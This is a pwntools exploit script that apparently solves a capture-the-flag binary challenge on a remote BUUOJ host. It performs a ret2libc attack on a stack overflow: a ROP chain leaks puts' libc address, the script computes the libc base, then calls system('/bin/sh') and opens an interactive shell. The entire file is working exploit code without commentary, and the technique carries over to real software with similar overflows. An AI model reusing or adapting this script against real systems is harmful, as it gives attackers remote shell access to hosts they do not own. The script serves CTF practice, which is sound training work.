from pwn import *

sh=remote("node5.buuoj.cn",26423)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main=0x00000000004007D6
pop_rdi_ret=0x0000000000400963


payload=0xd0*b'a'+b'aaaaaaaa'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
sh.recvuntil(b"Please tell me:")
sh.sendline(payload)

sh.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac")
sh.recv(2)
puts_addr=u64(sh.recvuntil(b"\x7f").ljust(8,b"\x00"))
#puts_addr=u64(sh.recv(6).ljust(8,b"\x00"))
libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh\x00"))

payload=0xd0*b'a'+b'aaaaaaaa'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+p64(main)
sh.recvuntil(b"Please tell me:")
sh.sendline(payload)
sh.interactive()
